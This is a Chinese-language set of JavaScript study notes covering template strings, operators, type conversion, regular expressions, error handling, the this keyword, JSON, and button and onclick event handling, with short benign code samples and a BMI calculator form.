<h3 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h3><p>模板字符串中可以同时使用单引号和双引号</p>
<p>模板字符串还支持多行文本，而无需使用特殊的转义字符：</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117461.png"></p>
<p>模板字面量还可以包含占位符——一种由美元符号和大括号分隔的嵌入式表达式：**${expression}**</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117462.png"></p>
<h2 id="JavaScript-运算符"><a href="#JavaScript-运算符" class="headerlink" title="JavaScript 运算符"></a>JavaScript 运算符</h2><h3 id="用于字符串的-运算符"><a href="#用于字符串的-运算符" class="headerlink" title="用于字符串的 + 运算符"></a>用于字符串的 + 运算符</h3><p>+ 运算符用于把文本值或字符串变量加起来（连接起来）</p>
<p>如需把两个或多个字符串变量连接起来，请使用 <strong>+</strong> 运算符</p>
<p>要想在两个字符串之间增加空格，需要把空格插入一个字符串之中或者把空格插入表达式中(txt3&#x3D;txt1+” “+txt2)</p>
<p>**规则:**如果把数字与字符串相加，结果将成为字符串！</p>
<h3 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h3><p><em>variablename</em>&#x3D;(<em>condition</em>)?<em>value1</em>:<em>value2</em> </p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117463.png"></p>
<p><strong>加法</strong>是两个<strong>数字</strong>相加。</p>
<p><strong>连接</strong>是两个<strong>字符串</strong>连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x = 10 + 5;     // x 的结果为 15</span><br><span class="line">var x = 10 + &quot;5&quot;;    // x 的结果为 &quot;105&quot;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript循环"><a href="#JavaScript循环" class="headerlink" title="JavaScript循环"></a>JavaScript循环</h2><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117464.png"></h3><p>在 switch 语句中，用恒等计算符(&#x3D;&#x3D;&#x3D;)进行比较</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var x = 10;</span><br><span class="line">switch(x) &#123;</span><br><span class="line">  case 10: alert(&quot;Hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上例会出现弹窗</p>
<h2 id="JavaScript-类型转换"><a href="#JavaScript-类型转换" class="headerlink" title="JavaScript 类型转换"></a>JavaScript 类型转换</h2><h3 id="constructor-属性"><a href="#constructor-属性" class="headerlink" title="constructor 属性"></a>constructor 属性</h3><p><strong>constructor</strong> 属性返回所有 JavaScript 变量的构造函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;John&quot;.constructor         // 返回函数 String() &#123; [native code] &#125;</span><br><span class="line">(3.14).constructor         // 返回函数 Number() &#123; [native code] &#125;</span><br><span class="line">false.constructor         // 返回函数 Boolean() &#123; [native code] &#125;</span><br><span class="line">[1,2,3,4].constructor       // 返回函数 Array()  &#123; [native code] &#125;</span><br><span class="line">&#123;name:&#x27;John&#x27;, age:34&#125;.constructor // 返回函数 Object() &#123; [native code] &#125;</span><br><span class="line">new Date().constructor       // 返回函数 Date()  &#123; [native code] &#125;</span><br><span class="line">function () &#123;&#125;.constructor     // 返回函数 Function()&#123; [native code] &#125;</span><br></pre></td></tr></table></figure>

<h3 id="JavaScript-类型转换-1"><a href="#JavaScript-类型转换-1" class="headerlink" title="JavaScript 类型转换"></a>JavaScript 类型转换</h3><p>JavaScript 变量可以转换为新变量或其他数据类型</p>
<h4 id="将数字转换为字符串"><a href="#将数字转换为字符串" class="headerlink" title="将数字转换为字符串"></a>将数字转换为字符串</h4><p>全局方法 <strong>String()</strong> 可以将数字，字母，变量，表达式转换为字符串</p>
<p>String(x)  String(123) </p>
<p>Number 方法 <strong>toString()</strong> 也是</p>
<p>x.toString()   (123).toString()</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">toExponential()</td>
<td align="left">把对象的值转换为指数计数法。</td>
</tr>
<tr>
<td align="left">toFixed()</td>
<td align="left">把数字转换为字符串，结果的小数点后有指定位数的数字。</td>
</tr>
<tr>
<td align="left">toPrecision()</td>
<td align="left">把数字格式化为指定的长度。</td>
</tr>
</tbody></table>
<h4 id="将布尔值转换为字符串"><a href="#将布尔值转换为字符串" class="headerlink" title="将布尔值转换为字符串"></a>将布尔值转换为字符串</h4><p>全局方法 <strong>String()</strong> </p>
<p>Boolean 方法 <strong>toString()</strong> </p>
<h4 id="将日期转换为字符串"><a href="#将日期转换为字符串" class="headerlink" title="将日期转换为字符串"></a>将日期转换为字符串</h4><p>Date() 返回字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date()  </span><br></pre></td></tr></table></figure>

<p>全局方法 String() 可以将日期对象转换为字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String(new Date())  </span><br></pre></td></tr></table></figure>

<p>Date 方法 <strong>toString()</strong> 也有相同的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj = new Date()</span><br><span class="line">obj.toString() </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">getDate()</td>
<td align="left">从 Date 对象返回一个月中的某一天 (1 ~ 31)。</td>
</tr>
<tr>
<td align="left">getDay()</td>
<td align="left">从 Date 对象返回一周中的某一天 (0 ~ 6)。</td>
</tr>
<tr>
<td align="left">getFullYear()</td>
<td align="left">从 Date 对象以四位数字返回年份。</td>
</tr>
<tr>
<td align="left">getHours()</td>
<td align="left">返回 Date 对象的小时 (0 ~ 23)。</td>
</tr>
<tr>
<td align="left">getMilliseconds()</td>
<td align="left">返回 Date 对象的毫秒(0 ~ 999)。</td>
</tr>
<tr>
<td align="left">getMinutes()</td>
<td align="left">返回 Date 对象的分钟 (0 ~ 59)。</td>
</tr>
<tr>
<td align="left">getMonth()</td>
<td align="left">从 Date 对象返回月份 (0 ~ 11)。</td>
</tr>
<tr>
<td align="left">getSeconds()</td>
<td align="left">返回 Date 对象的秒数 (0 ~ 59)。</td>
</tr>
<tr>
<td align="left">getTime()</td>
<td align="left">返回 1970 年 1 月 1 日至今的毫秒数。</td>
</tr>
</tbody></table>
<h4 id="将字符串转换为数字"><a href="#将字符串转换为数字" class="headerlink" title="将字符串转换为数字"></a>将字符串转换为数字</h4><p>全局方法 <strong>Number()</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Number(&quot;3.14&quot;)  // 返回 3.14</span><br><span class="line">Number(&quot; &quot;)    // 返回 0</span><br><span class="line">Number(&quot;&quot;)    // 返回 0</span><br><span class="line">Number(&quot;99 88&quot;)  // 返回 NaN</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">parseFloat()</td>
<td align="left">解析一个字符串，并返回一个浮点数。</td>
</tr>
<tr>
<td align="left">parseInt()</td>
<td align="left">解析一个字符串，并返回一个整数。</td>
</tr>
</tbody></table>
<h4 id="将布尔值转换为数字"><a href="#将布尔值转换为数字" class="headerlink" title="将布尔值转换为数字"></a>将布尔值转换为数字</h4><p>全局方法 <strong>Number()</strong> </p>
<h4 id="将日期转换为数字"><a href="#将日期转换为数字" class="headerlink" title="将日期转换为数字"></a>将日期转换为数字</h4><p>全局方法 <strong>Number()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d = new Date();</span><br><span class="line">Number(d)</span><br></pre></td></tr></table></figure>

<p>日期方法 <strong>getTime()</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d = new Date();</span><br><span class="line">d.getTime()  </span><br></pre></td></tr></table></figure>

<h4 id="自动转换为字符串"><a href="#自动转换为字符串" class="headerlink" title="自动转换为字符串"></a>自动转换为字符串</h4><p>当你尝试输出一个对象或一个变量时 JavaScript 会自动调用变量的 toString() 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = myVar;</span><br><span class="line"></span><br><span class="line">myVar = &#123;name:&quot;Fjohn&quot;&#125; // toString 转换为 &quot;[object Object]&quot;</span><br><span class="line">myVar = [1,2,3,4]    // toString 转换为 &quot;1,2,3,4&quot;</span><br><span class="line">myVar = new Date()   // toString 转换为 &quot;Fri Jul 18 2014 09:08:55 GMT+0200&quot;</span><br></pre></td></tr></table></figure>

<p>数字和布尔值也经常相互转换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myVar = 123       // toString 转换为 &quot;123&quot;</span><br><span class="line">myVar = true       // toString 转换为 &quot;true&quot;</span><br><span class="line">myVar = false      // toString 转换为 &quot;false&quot;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-正则表达式"><a href="#JavaScript-正则表达式" class="headerlink" title="JavaScript 正则表达式"></a>JavaScript 正则表达式</h2><p>使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式</p>
<p>正则表达式可用于所有文本搜索和文本替换的操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/正则表达式主体/修饰符(可选)</span><br></pre></td></tr></table></figure>

<p>var patt &#x3D; &#x2F;runoob&#x2F;i</p>
<p><strong>&#x2F;runoob&#x2F;i</strong> 是一个正则表达式。<strong>runoob</strong> 是一个<strong>正则表达式主体</strong> (用于检索)。<strong>i</strong> 是一个<strong>修饰符</strong> (搜索不区分大小写)</p>
<h3 id="字符串的使用"><a href="#字符串的使用" class="headerlink" title="字符串的使用"></a>字符串的使用</h3><p><strong>search()</strong> 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。</p>
<p><strong>replace()</strong> 方法用于在字符串中用一些字符串替换另一些字符串，或替换一个与正则表达式匹配的子串。</p>
<h3 id="RegExp-对象"><a href="#RegExp-对象" class="headerlink" title="RegExp 对象"></a>RegExp 对象</h3><h3 id="test-使用"><a href="#test-使用" class="headerlink" title="test()使用"></a>test()使用</h3><p>test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true</p>
<p>搜索字符串中的字符 “e”：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var patt = /e/;</span><br><span class="line">patt.test(&quot;The best things in life are free!&quot;);</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/e/.test(&quot;The best things in life are free!&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="exec-使用"><a href="#exec-使用" class="headerlink" title="exec()使用"></a>exec()使用</h3><p>exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var patt1=new RegExp(&quot;e&quot;);</span><br><span class="line">document.write(patt1.exec(&quot;The best things in life are free&quot;));</span><br></pre></td></tr></table></figure>

<p>输出为e</p>
<h2 id="JavaScript-错误"><a href="#JavaScript-错误" class="headerlink" title="JavaScript 错误"></a>JavaScript 错误</h2><h3 id="throw语句创建自定义错误"><a href="#throw语句创建自定义错误" class="headerlink" title="throw语句创建自定义错误"></a>throw语句创建自定义错误</h3><h3 id="try-语句测试代码块的错误"><a href="#try-语句测试代码块的错误" class="headerlink" title="try 语句测试代码块的错误"></a><strong>try</strong> 语句测试代码块的错误</h3><h3 id="catch-语句处理错误"><a href="#catch-语句处理错误" class="headerlink" title="catch 语句处理错误"></a><strong>catch</strong> 语句处理错误</h3><h3 id="finally-语句"><a href="#finally-语句" class="headerlink" title="finally 语句"></a>finally 语句</h3><p>finally 语句不论之前的 try 和 catch 中是否产生异常都会执行该代码块</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117465.png"></p>
<h2 id="JavaScript-表单"><a href="#JavaScript-表单" class="headerlink" title="JavaScript 表单"></a>JavaScript 表单</h2><h3 id="JavaScript-表单验证"><a href="#JavaScript-表单验证" class="headerlink" title="JavaScript 表单验证"></a>JavaScript 表单验证</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117466.png"></p>
<h3 id="JavaScript-验证输入的数字"><a href="#JavaScript-验证输入的数字" class="headerlink" title="JavaScript 验证输入的数字"></a>JavaScript 验证输入的数字</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117467.png"></p>
<h2 id="JavaScript关键字"><a href="#JavaScript关键字" class="headerlink" title="JavaScript关键字"></a>JavaScript关键字</h2><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><h4 id="方法中的-this"><a href="#方法中的-this" class="headerlink" title="方法中的 this"></a>方法中的 this</h4><p>this 指向调用它所在方法的对象</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117468.png"></p>
<h4 id="单独使用-this"><a href="#单独使用-this" class="headerlink" title="单独使用 this"></a>单独使用 this</h4><p>单独使用 this，则它指向全局(Global)对象</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117469.png"></p>
<h4 id="函数中使用-this"><a href="#函数中使用-this" class="headerlink" title="函数中使用 this"></a>函数中使用 this</h4><p>在函数中，函数的所属者默认绑定到 this 上</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117470.png"></p>
<p>严格模式下，<strong>this</strong> 为 <strong>undefined</strong>，因为严格模式下不允许默认绑定</p>
<h4 id="事件中的-this"><a href="#事件中的-this" class="headerlink" title="事件中的 this"></a>事件中的 this</h4><p>this 指向了接收事件的 HTML 元素</p>
<h4 id="对象方法中绑定"><a href="#对象方法中绑定" class="headerlink" title="对象方法中绑定"></a>对象方法中绑定</h4><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117471.png"></p>
<p>this 是 person 对象，person 对象是函数的所有者</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117472.png"></p>
<p><strong>this.firstName</strong> 表示 <strong>this</strong> (person) 对象的 <strong>firstName</strong> 属性</p>
<h4 id="显式函数绑定"><a href="#显式函数绑定" class="headerlink" title="显式函数绑定"></a>显式函数绑定</h4><p>函数也是对象，对象则有方法，apply 和 call 就是函数对象的方法，他们允许切换函数执行的上下文环境（context），即 this 绑定的对象</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117473.png"></p>
<h3 id="let"><a href="#let" class="headerlink" title="let"></a>let</h3><p>let 声明的变量只在 let 命令所在的代码块 <strong>{}</strong> 内有效，在 <strong>{}</strong> 之外不能访问</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117474.png"></p>
<p>在相同的作用域或块级作用域中，不能使用 <strong>let</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量</p>
<h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><p>const 用于声明一个或多个常量，声明时<strong>必须进行初始化</strong>，定义常量的值不能通过再赋值修改，也不能再次声明</p>
<p>const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 创建常量对象</span><br><span class="line">const car = &#123;type:&quot;Fiat&quot;, model:&quot;500&quot;, color:&quot;white&quot;&#125;;</span><br><span class="line"></span><br><span class="line">// 修改属性:</span><br><span class="line">car.color = &quot;red&quot;;</span><br><span class="line"></span><br><span class="line">// 添加属性</span><br><span class="line">car.owner = &quot;Johnson&quot;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 创建常量数组</span><br><span class="line">const cars = [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];</span><br><span class="line"></span><br><span class="line">// 修改元素</span><br><span class="line">cars[0] = &quot;Toyota&quot;;</span><br><span class="line"></span><br><span class="line">// 添加元素</span><br><span class="line">cars.push(&quot;Audi&quot;);</span><br></pre></td></tr></table></figure>

<h3 id="void"><a href="#void" class="headerlink" title="void"></a>void</h3><p>指定要计算一个表达式但是不返回值</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241225001117475.png"></p>
<p>href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别</p>
<p><strong>#</strong> 包含了一个位置信息，默认的锚是**#top** 也就是网页的上端。而javascript:void(0), 仅仅表示一个死链接。在页面很长的时候会使用 <strong>#</strong> 来定位页面的具体位置，格式为：**# + id**</p>
<h2 id="JavaScript-JSON"><a href="#JavaScript-JSON" class="headerlink" title="JavaScript JSON"></a>JavaScript JSON</h2><p>JSON 是用于存储和传输数据的格式， 通常用于服务端向网页传递数据 </p>
<h3 id="JSON-数组"><a href="#JSON-数组" class="headerlink" title="JSON 数组"></a>JSON 数组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;sites&quot;:[</span><br><span class="line">    &#123;&quot;name&quot;:&quot;Runoob&quot;, &quot;url&quot;:&quot;www.runoob.com&quot;&#125;, </span><br><span class="line">    &#123;&quot;name&quot;:&quot;Google&quot;, &quot;url&quot;:&quot;www.google.com&quot;&#125;,</span><br><span class="line">    &#123;&quot;name&quot;:&quot;Taobao&quot;, &quot;url&quot;:&quot;www.taobao.com&quot;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="JSON-字符串转换为-JavaScript-对象"><a href="#JSON-字符串转换为-JavaScript-对象" class="headerlink" title="JSON 字符串转换为 JavaScript 对象"></a>JSON 字符串转换为 JavaScript 对象</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var text = &#x27;&#123; &quot;sites&quot; : [&#x27; +</span><br><span class="line">    &#x27;&#123; &quot;name&quot;:&quot;Runoob&quot; , &quot;url&quot;:&quot;www.runoob.com&quot; &#125;,&#x27; +</span><br><span class="line">    &#x27;&#123; &quot;name&quot;:&quot;Google&quot; , &quot;url&quot;:&quot;www.google.com&quot; &#125;,&#x27; +</span><br><span class="line">    &#x27;&#123; &quot;name&quot;:&quot;Taobao&quot; , &quot;url&quot;:&quot;www.taobao.com&quot; &#125; ]&#125;&#x27;;</span><br><span class="line">    </span><br><span class="line">obj = JSON.parse(text);</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = obj.sites[1].name + &quot; &quot; + obj.sites[1].url;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/js/javascript-json-parse.html">JSON.parse()</a></td>
<td align="left">用于将一个 JSON 字符串转换为 JavaScript 对象。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/js/javascript-json-stringify.html">JSON.stringify()</a></td>
<td align="left">用于将 JavaScript 值转换为 JSON 字符串。</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">legend</span>&gt;</span>BMI计算器<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;meter&quot;</span>&gt;</span> 身高(m)<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;meter&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;weight&quot;</span>&gt;</span> 体重(kg)<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;weight&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myFunction()&quot;</span>&gt;</span>获取BMI<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;bmi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">var</span> meter,weight,bmii,a;</span></span><br><span class="line"><span class="language-javascript">			meter=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;meter&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">			weight=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;weight&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">			bmii=(weight/(meter*meter)).<span class="title function_">toFixed</span>(<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">if</span> (<span class="built_in">isNaN</span>(meter)||<span class="built_in">isNaN</span>(weight)||meter &lt;= <span class="number">0</span>||weight &lt;= <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bmi&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;请正确填写身高和体重！&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">      		&#125;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">if</span>(bmii&lt;<span class="number">18.5</span>)a=<span class="string">&quot;体重过低&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">else</span> <span class="keyword">if</span>(bmii&gt;=<span class="number">24</span>)a=<span class="string">&quot;体重过高&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">			<span class="keyword">else</span> a=<span class="string">&quot;正常&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bmi&quot;</span>).<span class="property">innerHTML</span>=bmii+a;</span></span><br><span class="line"><span class="language-javascript">			</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="button元素"><a href="#button元素" class="headerlink" title="button元素"></a>button元素</h2><p>常用于触发某些操作或事件，如提交表单、执行 JavaScript 函数等。你可以通过 <code>&lt;button&gt;</code> 元素来创建各种类型的按钮，并且可以为它们添加不同的属性和事件监听器</p>
<h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h3><h4 id="type-属性"><a href="#type-属性" class="headerlink" title="type 属性"></a><code>type</code> 属性</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button type=&quot;button&quot;&gt;普通按钮&lt;/button&gt; </span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;提交按钮&lt;/button&gt; </span><br><span class="line">&lt;button type=&quot;reset&quot;&gt;重置按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h4 id="disabled-属性"><a href="#disabled-属性" class="headerlink" title="disabled 属性"></a><code>disabled</code> 属性</h4><p>禁用按钮，用户无法点击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button disabled&gt;禁用按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h4 id="autofocus-属性"><a href="#autofocus-属性" class="headerlink" title="autofocus 属性"></a><code>autofocus</code> 属性</h4><p>页面加载时，自动聚焦到按钮</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button autofocus&gt;自动聚焦按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h4 id="name-属性"><a href="#name-属性" class="headerlink" title="name 属性"></a><code>name</code> 属性</h4><p>为按钮指定名称，通常在表单提交时使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button name=&quot;submitBtn&quot; type=&quot;submit&quot;&gt;提交&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h4 id="value-属性"><a href="#value-属性" class="headerlink" title="value 属性"></a><code>value</code> 属性</h4><p>为按钮指定一个值，通常配合 <code>type=&quot;submit&quot;</code> 使用，表示提交时传递的参数值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button type=&quot;submit&quot; value=&quot;submitForm&quot;&gt;提交表单&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用-JavaScript-与按钮交互"><a href="#使用-JavaScript-与按钮交互" class="headerlink" title="使用 JavaScript 与按钮交互"></a>使用 JavaScript 与按钮交互</h3><p>可以使用 JavaScript 为按钮添加点击事件，执行特定的操作</p>
<p>可以通过 <code>addEventListener()</code> 方法绑定多个事件，支持复杂的事件处理和监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=&quot;alert(&#x27;按钮被点击！&#x27;)&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  // 也可以通过 JavaScript 来绑定事件</span><br><span class="line">  const button = document.querySelector(&quot;button&quot;);</span><br><span class="line">  button.addEventListener(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;按钮被点击！&quot;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="动态按钮"><a href="#动态按钮" class="headerlink" title="动态按钮"></a>动态按钮</h3><p>按钮可以通过 JavaScript 来动态改变文本、颜色或状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot; onclick=&quot;changeText()&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function changeText() &#123;</span><br><span class="line">    const button = document.getElementById(&quot;myButton&quot;);</span><br><span class="line">    button.innerHTML = &quot;按钮已被点击&quot;;</span><br><span class="line">    button.style.backgroundColor = &quot;red&quot;;</span><br><span class="line">    button.disabled = true; // 禁用按钮</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="onclick与addEventListener"><a href="#onclick与addEventListener" class="headerlink" title="onclick与addEventListener()"></a>onclick与addEventListener()</h2><h3 id="oncllick"><a href="#oncllick" class="headerlink" title="oncllick"></a>oncllick</h3><p>一个 HTML 事件属性，用于在用户点击某个元素时触发指定的 JavaScript 函数或代码。这个事件最常见的用法是在<strong>按钮、链接或任何可点击的元素上绑定点击事件</strong></p>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><h5 id="在-HTML-中使用-onclick"><a href="#在-HTML-中使用-onclick" class="headerlink" title="在 HTML 中使用 onclick"></a>在 HTML 中使用 <code>onclick</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=&quot;alert(&#x27;按钮被点击了！&#x27;)&quot;&gt;点击我&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<h5 id="调用-JavaScript-函数"><a href="#调用-JavaScript-函数" class="headerlink" title="调用 JavaScript 函数"></a>调用 JavaScript 函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=&quot;myFunction()&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function myFunction() &#123;</span><br><span class="line">    alert(&#x27;按钮被点击了！&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="通过-JavaScript-动态绑定-onclick-事件"><a href="#通过-JavaScript-动态绑定-onclick-事件" class="headerlink" title="通过 JavaScript 动态绑定 onclick 事件"></a>通过 JavaScript 动态绑定 <code>onclick</code> 事件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  document.getElementById(&#x27;myButton&#x27;).onclick = function() &#123;</span><br><span class="line">    alert(&#x27;按钮被点击了！&#x27;);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用 JavaScript 选择了 ID 为 <code>myButton</code> 的按钮，并为其添加了一个 <code>onclick</code> 事件监听器</p>
